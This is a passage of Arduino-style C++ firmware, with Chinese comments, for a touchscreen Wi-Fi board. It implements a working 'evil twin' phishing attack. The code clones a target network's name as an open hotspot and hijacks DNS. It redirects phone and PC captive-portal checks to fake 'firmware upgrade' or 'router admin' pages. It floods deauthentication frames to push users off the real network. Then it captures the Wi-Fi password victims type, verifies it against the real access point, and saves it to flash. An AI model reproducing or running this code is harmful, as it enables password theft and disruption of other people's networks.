  Serial.println("[熄屏] 自动熄屏: " + String(g_autoSleepSec == 0 ? "关闭" : String(g_autoSleepSec) + "秒"));
}

static void autoSleepSave() {
  int32_t magic = AUTO_SLEEP_EEPROM_MAGIC;
  uint8_t* mp = (uint8_t*)&magic;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(AUTO_SLEEP_EEPROM_ADDR + i, mp[i]);

  int32_t val = g_autoSleepSec;
  uint8_t* vp = (uint8_t*)&val;
  for (size_t i = 0; i < sizeof(int32_t); i++)
    EEPROM.write(AUTO_SLEEP_EEPROM_ADDR + sizeof(int32_t) + i, vp[i]);

  EEPROM.commit();  // ★ 持久化到Flash
}

static void phishAddPassword(const String& ssid, const String& password, bool verified) {
  // 去重
  for (int i = 0; i < phishPasswordCount; i++) {
    if (String(phishPasswords[i].ssid) == ssid) {
      utf8SafeCopy(phishPasswords[i].password, sizeof(phishPasswords[i].password), password.c_str());
      phishPasswords[i].verified = verified;
      phishPasswords[i].timestamp = millis();
      phishSavePasswords();
      return;
    }
  }
  if (phishPasswordCount >= PHISH_MAX_PASSWORDS) {
    for (int i = 0; i < PHISH_MAX_PASSWORDS - 1; i++)
      phishPasswords[i] = phishPasswords[i + 1];
    phishPasswordCount = PHISH_MAX_PASSWORDS - 1;
  }
  utf8SafeCopy(phishPasswords[phishPasswordCount].ssid, sizeof(phishPasswords[phishPasswordCount].ssid), ssid.c_str());
  utf8SafeCopy(phishPasswords[phishPasswordCount].password, sizeof(phishPasswords[phishPasswordCount].password), password.c_str());
  phishPasswords[phishPasswordCount].verified = verified;
  phishPasswords[phishPasswordCount].timestamp = millis();
  phishPasswordCount++;
  phishSavePasswords();
}

// === UTF-8 / HTML 辅助函数 ===

// UTF-8 安全拷贝：保证不在多字节字符中间截断
// dstSize 为 dst 缓冲区总大小（含结尾 \0）
static void utf8SafeCopy(char* dst, size_t dstSize, const char* src) {
  if (!dst || !src || dstSize == 0) return;
  size_t srcLen = strlen(src);
  if (srcLen < dstSize) {
    memcpy(dst, src, srcLen + 1);  // 包括 \0
    return;
  }
  // 需要截断：从 dstSize-1 处向前找合法的 UTF-8 边界
  size_t cut = dstSize - 1;
  while (cut > 0 && (src[cut] & 0xC0) == 0x80) cut--;  // 跳过多字节序列的后续字节
  memcpy(dst, src, cut);
  dst[cut] = '\0';
}

// 返回 UTF-8 安全截断后的 String（最大 maxBytes 字节）
static String utf8SafeTruncate(const String& s, size_t maxBytes) {
  if (s.length() <= maxBytes) return s;
  size_t cut = maxBytes;
  while (cut > 0 && (s[cut] & 0xC0) == 0x80) cut--;
  return s.substring(0, cut);
}

// HTML 特殊字符转义（防 XSS / 页面结构破坏）
static String htmlEscape(const String& s) {
  String r;
  r.reserve(s.length() + 16);
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    switch (c) {
      case '<':  r += "&lt;";    break;
      case '>':  r += "&gt;";    break;
      case '&':  r += "&amp;";   break;
      case '"':  r += "&quot;";  break;
      case '\'': r += "&#39;";   break;
      default:   r += c;         break;
    }
  }
  return r;
}

// 发送钓鱼 HTTP 响应
static void phishSendPage(WiFiClient& client) {
  String page;
  switch (g_phishPageType) {
    case 0: default: page = PHISH_HTML;  break;
    case 1:          page = PHISH_HTML2; break;
    case 2:          page = PHISH_HTML3; break;
    case 3:          page = PHISH_HTML4; break;
  }
  page.replace("%SSID%", htmlEscape(phishingTargetSSID));
  
  // ★ 检测页面构建是否失败（高并发/内存不足时 String 可能为空）
  if (page.length() < 200) {
    Serial.print("[Phish] WARNING: Page length="); Serial.println(page.length());
    client.println(F("HTTP/1.1 500 Internal Error"));
    client.println(F("Content-Type: text/plain"));
    client.println(F("Content-Length: 21"));
    client.println(F("Connection: close"));
    client.println();
    client.print(F("Page build error (500)"));
    return;
  }

  client.print(F("HTTP/1.1 200 OK\r\n"));
  client.print(F("Content-Type: text/html; charset=utf-8\r\n"));
  client.print(F("Cache-Control: no-cache, no-store, must-revalidate\r\n"));
  client.print(F("Pragma: no-cache\r\n"));
  client.print(F("Content-Length: "));
  client.print(page.length());
  client.print(F("\r\nConnection: close\r\n\r\n"));
  client.print(page);
}

// ★ 强制门户检测URL → 302重定向（比200+HTML更可靠触发系统弹窗）
static void phishSendRedirect(WiFiClient& client) {
  client.print(F("HTTP/1.1 302 Found\r\n"));
  client.print(F("Location: http://192.168.1.1/\r\n"));
  client.print(F("Content-Length: 0\r\n"));
  client.print(F("Connection: close\r\n"));
  client.print(F("\r\n"));
}

// === 协同延迟：拆解长阻塞为 50ms 片段，每段检测停止 + 刷新验证进度 ===
// 返回 true 表示被停止信号中断
static bool cooperativeDelay(unsigned long ms, unsigned long& progressMs, unsigned long totalEstimate) {
  unsigned long start = millis();
  unsigned long lastDraw = 0;  // ★ 独立跟踪上次进度条刷新时间，避免%运算遗漏
  while (millis() - start < ms) {
    delay(50);
    // 检测停止按钮
    checkAttackStop();
    if (g_attackStop) return true;
    // 每 300ms 刷新验证进度条
    progressMs += 50;
    unsigned long seg = progressMs / 300;
    if (seg != lastDraw && totalEstimate > 0) {
      lastDraw = seg;
      int barX = 20, barY = 150, barW = SCREEN_WIDTH - 40, barH = 10;
      int pct = (int)(progressMs * (barW - 2) / totalEstimate);
      if (pct > barW - 2) pct = barW - 2;
      tft.fillRect(barX + 1, barY + 1, pct, barH - 2,
                   progressMs > totalEstimate * 2 / 3 ? 0x07E0 : 0xFFE0);
    }
  }
  return false;
}

// 绘制验证状态界面（在收到密码后、验证开始前调用）
static void phishDrawVerifyStatus(const char* status, unsigned long elapsed, unsigned long total) {
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0xFC00);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0xFC00);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("密码验证中");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("密码验证中");

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  String ssidLabel = "SSID: " + phishingTargetSSID;
  tw = u8g2_for_adafruit_gfx.getUTF8Width(ssidLabel.c_str());
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 60);
  u8g2_for_adafruit_gfx.print(ssidLabel);

  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(10, 88);
  u8g2_for_adafruit_gfx.print(status);

  // 进度条
  tft.drawRect(20, 150, SCREEN_WIDTH - 40, 10, 0x8410);
  int barW = 0;
  if (total > 0) {
    barW = (int)(elapsed * (SCREEN_WIDTH - 42) / total);
    if (barW > SCREEN_WIDTH - 42) barW = SCREEN_WIDTH - 42;
  }
  tft.fillRect(21, 151, barW, 8, 0xFFE0);

  // 提示
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(10, 180);
  u8g2_for_adafruit_gfx.print("正在连接目标AP验证密码...");
  u8g2_for_adafruit_gfx.setCursor(10, 197);
  u8g2_for_adafruit_gfx.print("请稍候，验证完成后将显示结果");

  // 停止按钮（仍在验证期间可用）
  int sby = 230;
  tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, 40, 6, COLOR_BTN_BACK);
  tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, 40, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("停止验证");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, sby + 26);
  u8g2_for_adafruit_gfx.print("停止验证");
}

// 用捕获密码连接真实 AP 验证
static bool phishVerifyPassword(const String& pwd) {
  Serial.print("[Phish] 验证密码: ");
  Serial.println(pwd);

  unsigned long progressMs = 0;
  // 预估总耗时：连接等待 ~8s + 断开清理 ~1s = 约 9000ms（并发模式无需恢复AP）
  const unsigned long totalEstimate = 9000;

  char ssidBuf[33], pwdBuf[64];
  utf8SafeCopy(ssidBuf, sizeof(ssidBuf), phishingTargetSSID.c_str());
  utf8SafeCopy(pwdBuf, sizeof(pwdBuf), pwd.c_str());

  // 阶段1：尝试连接真实 AP
  phishDrawVerifyStatus("正在连接目标AP...", 0, totalEstimate);
  progressMs = 500;
  WiFi.begin(ssidBuf, pwdBuf);

  int retry = 0;
  while (WiFi.status() != WL_CONNECTED && retry < 16) {
    if (cooperativeDelay(500, progressMs, totalEstimate)) {
      // 用户点停止 → 取消验证
      Serial.println("[Phish] 验证被用户取消");
      WiFi.disconnect();
      return false;
    }
    retry++;
  }
  bool ok = (WiFi.status() == WL_CONNECTED);

  // 阶段2：断开真实AP
  if (ok) {
    phishDrawVerifyStatus("验证通过，断开连接...", progressMs, totalEstimate);
    WiFi.disconnect();
    if (cooperativeDelay(500, progressMs, totalEstimate)) {
      WiFi.disconnect();
      return false;
    }
  } else {
    phishDrawVerifyStatus("密码错误...", progressMs, totalEstimate);
    // ★ 并发模式下仅断开STA连接，AP保持在线不中断
    WiFi.disconnect();
  }

  // ★ 并发模式下AP始终保持在线，无需重启AP和DNS/Web服务
  // 阶段3：稳定等待
  phishDrawVerifyStatus(ok ? "验证通过，即将显示结果..." : "验证结束，即将返回...", progressMs, totalEstimate);
  if (cooperativeDelay(300, progressMs, totalEstimate)) {
    return false;
  }

  Serial.print("[Phish] 验证结果: "); Serial.println(ok ? "成功" : "失败");
  return ok;
}

// 处理钓鱼 Web 请求
static void phishHandleWeb() {
  WiFiClient client = phishingWebServer.available();
  if (!client) return;

  String line = "", req = "", pwd = "";
  while (client.connected() && client.available()) {
    int c = client.read();          // read() 返回 int，-1 表示无数据
    if (c < 0) break;              // 无数据时安全退出
    if (c == '\n') {
      if (line.length() == 0) break;
      if (line.startsWith("GET")) req = line;
      line = "";
    } else if (c != '\r') {
      line += (char)c;
    }
  }

  if (req.indexOf("GET /wifi?password=") >= 0) {
    int ps = req.indexOf("password=") + 9;
    int pe = req.indexOf(' ', ps);
    if (pe < 0) pe = req.length();
    pwd = req.substring(ps, pe);
    // ★ 通用URL解码：将 %XX 和 + 正确转换为字符
    {
      String decoded = "";
      for (size_t i = 0; i < pwd.length(); i++) {
        if (pwd[i] == '%' && i + 2 < pwd.length()) {
          char hi = pwd[++i], lo = pwd[++i];
          auto hx = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            return -1;
          };
          int h = hx(hi), l = hx(lo);
          if (h >= 0 && l >= 0) decoded += (char)((h << 4) | l);
          else decoded += '%';
        } else if (pwd[i] == '+') {
          decoded += ' ';
        } else {
          decoded += pwd[i];
        }
      }
      pwd = decoded;
    }

    // ★ 关键修复：先立即响应客户端"已收到"，再异步验证密码
    //   避免 WiFi.begin() 切换模式时断开客户端连接导致响应丢失
    // ★ 添加 Content-Length 确保 iOS/Android 热点登录页正确解析响应
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 1\r\nConnection: close\r\n\r\n1"));
    phishingCapturedPwd = pwd;                    // 立即保存密码
    // ★ 立即写入密码管理列表（verified=false），防止验证过程中丢失
    phishAddPassword(phishingTargetSSID, pwd, false);
    phishingVerifyStatus = 0;                     // ★ 通知 /check 正在验证中
    phishingNeedsVerify = true;                   // 标记需要后台验证
    phishingVerifyPwd = pwd;                      // 保存待验证密码
    Serial.print("[Phish] 收到密码(已暂存): "); Serial.println(pwd);
  } else if (req.indexOf("GET /check") >= 0) {
    // ★ 验证状态轮询端点: -1=无, 0=验证中, 1=成功, 2=失败
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 1\r\nConnection: close\r\n\r\n"));
    client.print(String(phishingVerifyStatus));

  // ★ 强制门户检测URL → 302重定向触发系统弹窗
  } else if (req.indexOf("GET /generate_204") >= 0 ||   // Android
             req.indexOf("GET /gen_204")     >= 0) {    // Android 变体
    phishSendRedirect(client);
  } else if (req.indexOf("GET /hotspot-detect.html") >= 0 ||  // iOS/macOS
             req.indexOf("GET /success.txt")        >= 0 ||   // iOS 变体
             req.indexOf("GET /canonical.html")     >= 0) {   // Firefox
    phishSendRedirect(client);
  } else if (req.indexOf("GET /ncsi.txt") >= 0 ||     // Windows NCSI
             req.indexOf("GET /redirect") >= 0) {      // Windows
    phishSendRedirect(client);
  } else if (req.indexOf("GET /favicon.ico") >= 0) {
    // 忽略浏览器图标请求，不消耗内存响应大页面
    client.print(F("HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n"));

  } else if (req.indexOf("GET /") >= 0 || req.length() == 0) {
    // ★ 根路径或任意其他GET请求 → 返回钓鱼页面（DNS劫持后统一入口）
    phishSendPage(client);

  } else {
    // 非GET请求 → 忽略
    client.print(F("HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n"));
  }
  client.stop();
}

// 发送目标 AP Deauth 帧 (断开客户端)
static void phishSendDeauth() {
  wext_set_channel(WLAN0_NAME, phishingTargetChannel);  // 确保在目标信道
  for (int t = 0; t < 3 && !g_attackStop; t++) {
    DeauthFrame frame;
    memcpy(frame.source, phishingTargetBSSID, 6);
    memcpy(frame.access_point, phishingTargetBSSID, 6);
    memcpy(frame.destination, BROADCAST_MAC, 6);
    frame.reason = 7;  // Class 3 frame received from nonassociated STA
    wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
  }
}

// ====== WiFi钓鱼 攻击 ======
static void phishingAttackWifi() {
  // 1) 检查已选目标
  int targetIdx = -1;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) { targetIdx = (int)i; break; }
  }
  if (targetIdx < 0) {
    Serial.println("[Phish] 没有选中的目标!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先在WiFi列表中勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先在WiFi列表中勾选目标AP!");
    int rby = 250, rbh = 45;
    tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
    tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("返回菜单");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
    u8g2_for_adafruit_gfx.print("返回菜单");
    while (true) {
        int16_t tx, ty;
      if (touch_read(&tx, &ty) && ty >= rby && ty <= rby + 45 && tx >= 40 && tx <= SCREEN_WIDTH - 40) {
        while (touch_read(&tx, &ty)) delay(10); break;
      }
      delay(30);
    }
    g_touchValid = false;
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  const WiFiScanResult& tgt = scan_results[targetIdx];
  phishingTargetSSID = tgt.ssid.length() > 0 ? tgt.ssid : "";
  memcpy(phishingTargetBSSID, tgt.bssid, 6);
  phishingTargetChannel = tgt.channel;

  if (phishingTargetSSID.length() == 0) {
    char mac[18]; snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
      phishingTargetBSSID[0], phishingTargetBSSID[1], phishingTargetBSSID[2],
      phishingTargetBSSID[3], phishingTargetBSSID[4], phishingTargetBSSID[5]);
    phishingTargetSSID = String(mac);
  }


  Serial.print("[Phish] 目标: "); Serial.print(phishingTargetSSID);
  Serial.print(" CH"); Serial.println(phishingTargetChannel);

  // 2) 显示初始化
  g_attackStop = false;
  g_attackRunningType = 8;
  g_screen = SCREEN_ATTACK_RUNNING;

  tft.fillScreen(COLOR_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("正在创建钓鱼热点...");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
  u8g2_for_adafruit_gfx.print("正在创建钓鱼热点...");

  // 3) 停旧服务 + 建开放式 AP
  phishingWebServer.stop();
  phishingDnsServer.stop();
  delay(300);

  char ssidBuf[33]; utf8SafeCopy(ssidBuf, sizeof(ssidBuf), phishingTargetSSID.c_str());
  char chBuf[4]; snprintf(chBuf, sizeof(chBuf), "%d", phishingTargetChannel);

  // ★ 启用并发模式（STA+AP），验证密码时AP不中断
  WiFi.enableConcurrent();

  // ★★ WiFi.config() 必须在 apbegin() 之前调用 ★★
  //   apbegin()→dhcps_init()从netif读取IP作为DHCP分发的DNS地址
  WiFi.config(IPAddress(192,168,1,1), IPAddress(192,168,1,1),
              IPAddress(192,168,1,1), IPAddress(255,255,255,0));

  // ★★★ 关键：在apbegin之前启动自定义DNS，抢占端口53 ★★★
  //   AmebaD的dhcps_init()会自动启动内置DNS（只响应amebaiot.com，其他REFUSED）
  //   我们的DNS先绑定端口53 → dhcps_init()的dns_server_init()绑定失败 → 内置DNS不启动
  //   → 所有DNS查询由我们劫持 → 强制门户弹窗立即触发！
  phishingDnsServer.setResolvedIP(192,168,1,1);
  phishingDnsServer.begin();

  int apRetry = 0, apResult = 0;
  while (apRetry < 10) {
    apResult = WiFi.apbegin(ssidBuf, chBuf, (uint8_t)0);
    if (apResult == WL_CONNECTED) break;
    apRetry++; delay(800);
  }
  if (apResult != WL_CONNECTED) {
    Serial.println("[Phish] AP启动失败");
    phishingDnsServer.stop();  // ★ AP失败时释放端口
    tft.fillScreen(COLOR_BG);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("创建热点失败!");
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("创建热点失败!");
    delay(2000);
    g_attackStop = false;       // ★ 复位停止标志，避免loop误判
    g_attackRunningType = -1;
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  // ★ apbegin()后再次确认IP（双重保险），确保AP以正确IP运行
  WiFi.config(IPAddress(192,168,1,1), IPAddress(192,168,1,1),
              IPAddress(192,168,1,1), IPAddress(255,255,255,0));

  // 4) 启动 Web 服务（DNS已在apbegin前启动，抢占端口53）
  IPAddress apIp = WiFi.localIP();
  Serial.print("[Phish] AP IP: "); Serial.println(apIp);
  Serial.print("[Phish] DNS已占用端口53 (apbegin前启动): "); Serial.println(apIp);
  phishingWebServer.begin();
  phishingActive = true;
  phishingPasswordRcvd = false;
  phishingPwdVerified = false;
  phishingPwdSuccess = false;
  phishingCapturedPwd = "";
  phishingNeedsVerify = false;
  phishingVerifyPwd = "";
  phishingVerifyStatus = -1;

  Serial.print("[Phish] 钓鱼热点已创建, IP="); Serial.println(apIp);

  unsigned long startMs = millis();
  unsigned long lastDeauthMs = 0;
  unsigned long lastDrawMs = 0;
  int deauthCount = 0;

  // 预绘制静态界面（只绘制一次）
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0xFC00);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0xFC00);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("WiFi钓鱼");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("WiFi钓鱼");

  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  String targetDisp = "目标: " + phishingTargetSSID;
  if (u8g2_for_adafruit_gfx.getUTF8Width(targetDisp.c_str()) > SCREEN_WIDTH - 10) {
    targetDisp = "目标: " + utf8SafeTruncate(phishingTargetSSID, 18) + "..";
  }
  u8g2_for_adafruit_gfx.setCursor(5, 52);
  u8g2_for_adafruit_gfx.print(targetDisp);
  u8g2_for_adafruit_gfx.setCursor(5, 68);
  u8g2_for_adafruit_gfx.print("信道: CH" + String(phishingTargetChannel));
  u8g2_for_adafruit_gfx.setCursor(5, 84);
  String ipStr = String(apIp[0]) + "." + String(apIp[1]) + "." + String(apIp[2]) + "." + String(apIp[3]);
  u8g2_for_adafruit_gfx.print("IP: " + ipStr);

  const char* typeNames[] = {"网络修复", "固件升级", "安全认证", "路由器管理"};
  u8g2_for_adafruit_gfx.setForegroundColor(0xFC00);
  u8g2_for_adafruit_gfx.setCursor(5, 100);
  u8g2_for_adafruit_gfx.print("页面: " + String(typeNames[g_phishPageType]));

  tft.drawLine(0, 112, SCREEN_WIDTH, 112, 0x18E7);

  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(5, 190);
  u8g2_for_adafruit_gfx.print("等待客户端连接钓鱼热点...");
  u8g2_for_adafruit_gfx.setCursor(5, 207);
  u8g2_for_adafruit_gfx.print("连接后输入密码将自动验证");

  // 停止钓鱼按钮
  int sby = 230;
  tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, 40, 6, COLOR_BTN_BACK);
  tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, 40, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
  int stopBtnTw = u8g2_for_adafruit_gfx.getUTF8Width("停止钓鱼");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - stopBtnTw) / 2, sby + 26);
  u8g2_for_adafruit_gfx.print("停止钓鱼");

  // 5) 主循环
  while (phishingActive && !g_attackStop) {
    checkAttackStop();
    if (g_attackStop) {
      // 即时反馈：清屏并提示正在停止
      tft.fillScreen(COLOR_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      int tw2 = u8g2_for_adafruit_gfx.getUTF8Width("正在停止钓鱼攻击...");
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw2) / 2, 140);
      u8g2_for_adafruit_gfx.print("正在停止钓鱼攻击...");
      break;
    }
    if (millis() - lastDeauthMs >= 100) {
      phishSendDeauth();
      deauthCount += 3;
      lastDeauthMs = millis();
    }

    // 处理 Web 请求
    phishHandleWeb();

    // ★ 异步验证：密码已捕获到 phishingCapturedPwd，在后台验证不阻塞客户端
    if (phishingNeedsVerify) {
      phishingNeedsVerify = false;
      bool ok = phishVerifyPassword(phishingVerifyPwd);
      if (g_attackStop) {
        // 验证过程中用户点击了停止，phishVerifyPassword 已处理断开
        break;
      }
      phishingPasswordRcvd = true;
      phishingPwdVerified = true;
      phishingPwdSuccess = ok;
      phishingVerifyStatus = ok ? 1 : 2;          // ★ 持久结果供 /check 轮询
      if (ok) {
        // ★ 验证通过：更新密码管理列表中该条目为 verified=true
        phishAddPassword(phishingTargetSSID, phishingCapturedPwd, true);
        Serial.print("[Phish] 验证成功: "); Serial.println(phishingCapturedPwd);
      } else {
        Serial.println("[Phish] 验证失败（密码错误，条目保留 verified=false）");
      }
    }

    // 密码验证成功 → 显示结果
    if (phishingPasswordRcvd && phishingPwdSuccess) {
      phishingPasswordRcvd = false;

      // === 绘制成功界面 ===
      tft.fillScreen(COLOR_BG);

      // 标题栏 - 绿色
      tft.fillRect(0, 0, SCREEN_WIDTH, 38, 0x07E0);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
      tw = u8g2_for_adafruit_gfx.getUTF8Width("密码捕获成功!");
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 27);
      u8g2_for_adafruit_gfx.print("密码捕获成功!");

      // 信息卡片区域
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

      // SSID
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
      u8g2_for_adafruit_gfx.setCursor(10, 56);
      u8g2_for_adafruit_gfx.print("SSID:");
      u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
      u8g2_for_adafruit_gfx.setCursor(55, 56);
      String ssidDisp = phishingTargetSSID;
      if (u8g2_for_adafruit_gfx.getUTF8Width(ssidDisp.c_str()) > SCREEN_WIDTH - 65) {
        ssidDisp = utf8SafeTruncate(ssidDisp, 18) + "..";
      }
      u8g2_for_adafruit_gfx.print(ssidDisp);

      // 密码 - 分两行显示，避免截断
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
      u8g2_for_adafruit_gfx.setCursor(10, 78);
      u8g2_for_adafruit_gfx.print("密码:");
      u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
      String pwd = phishingCapturedPwd;
      if (pwd.length() <= 22) {
        // 短密码单行
        u8g2_for_adafruit_gfx.setCursor(55, 78);
        u8g2_for_adafruit_gfx.print(pwd);
      } else {
        // 长密码分两行
        u8g2_for_adafruit_gfx.setCursor(55, 78);
        u8g2_for_adafruit_gfx.print(pwd.substring(0, 22));
        u8g2_for_adafruit_gfx.setCursor(10, 98);
        String p2 = pwd.substring(22);
        if (p2.length() > 28) p2 = p2.substring(0, 26) + "..";
        u8g2_for_adafruit_gfx.print("     " + p2);
      }

      // 分隔线
      tft.drawLine(10, 118, SCREEN_WIDTH - 10, 118, 0x18E7);

      // 验证状态
      u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
      u8g2_for_adafruit_gfx.setCursor(10, 138);
      u8g2_for_adafruit_gfx.print("✓ 密码已验证通过");

      // 提示信息（密码已自动保存到 EEPROM）
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
      u8g2_for_adafruit_gfx.setCursor(10, 160);
      u8g2_for_adafruit_gfx.print("已自动保存到 钓鱼→密码管理 列表");

      u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
      u8g2_for_adafruit_gfx.setCursor(10, 180);
      u8g2_for_adafruit_gfx.print("可在钓鱼攻击子菜单中查看管理");

      // === "返回菜单" 按钮（密码已自动保存，无需手动确认）===
      int rby = 215;
      tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, 42, 8, 0x07E0);
      tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, 42, 8, COLOR_WHITE);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
      tw = u8g2_for_adafruit_gfx.getUTF8Width("返回菜单");
      u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
      u8g2_for_adafruit_gfx.print("返回菜单");

      while (true) {
        int16_t tx, ty;
        if (touch_read(&tx, &ty) && ty >= rby && ty <= rby + 42 &&
            tx >= 40 && tx <= SCREEN_WIDTH - 40) {
          while (touch_read(&tx, &ty)) delay(10);
          break;
        }
        delay(30);
      }

      phishingActive = false;
      break;
    }

    // 密码验证失败 → 立即重绘屏幕继续钓鱼（密码已捕获到 phishingCapturedPwd）
    if (phishingPasswordRcvd && !phishingPwdSuccess) {
      phishingPasswordRcvd = false;
      phishingPwdVerified = false;
      // 不清理 phishingCapturedPwd，保留供攻击者查看
      lastDrawMs = 0;  // 强制立即刷新，覆盖"验证中"界面
    }

    // UI 刷新 500ms - 只重绘动态内容
    if (millis() - lastDrawMs >= 500) {
      lastDrawMs = millis();
      unsigned long sec = (millis() - startMs) / 1000;

      // 清除动态区域背景
      tft.fillRect(5, 120, SCREEN_WIDTH - 10, 54, COLOR_BG);

      // Deauth已发
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      u8g2_for_adafruit_gfx.setCursor(5, 127);
      u8g2_for_adafruit_gfx.print("Deauth已发: " + String(deauthCount));

      // 运行时间
      u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
      u8g2_for_adafruit_gfx.setCursor(5, 144);
      u8g2_for_adafruit_gfx.print("运行: " + String(sec) + "s");

      // 进度条
      tft.drawRect(10, 164, SCREEN_WIDTH - 20, 10, 0x8410);
      int barW = (int)((SCREEN_WIDTH - 22) * sec / 120);
      if (barW > SCREEN_WIDTH - 22) barW = SCREEN_WIDTH - 22;
      tft.fillRect(11, 165, barW, 8, sec > 90 ? 0xFC00 : 0x07E0);
    }
    // 分段延迟，每10ms检测一次停止，响应更灵敏
    for (int dl = 0; dl < 3 && !g_attackStop; dl++) delay(10);
  }

